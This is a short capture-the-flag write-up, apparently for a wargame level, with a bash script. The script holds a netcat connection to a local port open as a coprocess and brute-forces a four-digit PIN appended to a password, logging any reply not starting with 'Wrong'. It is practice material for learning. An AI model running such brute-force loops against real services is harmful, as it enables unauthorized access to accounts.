24 -> 25

So what we do is create this script using the coproc command to keep running the netcat TCP connection in a parallel shell we can comunicate to stdin and stdout of that shell through NC[0] and NC[1].

This is the script:

#!/bin/bash

coproc NC { nc localhost 30002; }

i=0
for i in {0..10000};
do
        echo $i
        PAD_NUMBER=$(printf "%04d\n" "$i")
        PASSWORD="{previous_password} $PAD_NUMBER"
        echo $PASSWORD >&"${NC[1]}"
        read -r response <&"${NC[0]}"
        echo "Number: $PASSWORD Response: $response"

        if [[ $response != Wrong* ]] ;
        then
                echo $response >> password.txt
        fi
done
